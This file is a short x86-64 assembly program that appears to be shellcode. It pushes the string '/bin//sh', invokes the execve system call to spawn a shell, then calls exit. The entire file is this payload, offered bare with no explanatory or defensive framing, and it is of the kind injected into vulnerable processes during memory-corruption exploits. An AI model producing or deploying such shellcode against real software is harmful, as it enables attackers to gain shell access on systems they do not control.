		.global _start

		.text

_start:
		push		%rax
		movabs		$0x68732f2f6e69622f, %rdi
		push		%rdi
		mov 		%rsp, %rdi
		mov		$0x3b, %al
		syscall

		# exit(0)
		mov		$60, %al
		xor 		%rdi, %rdi
		syscall




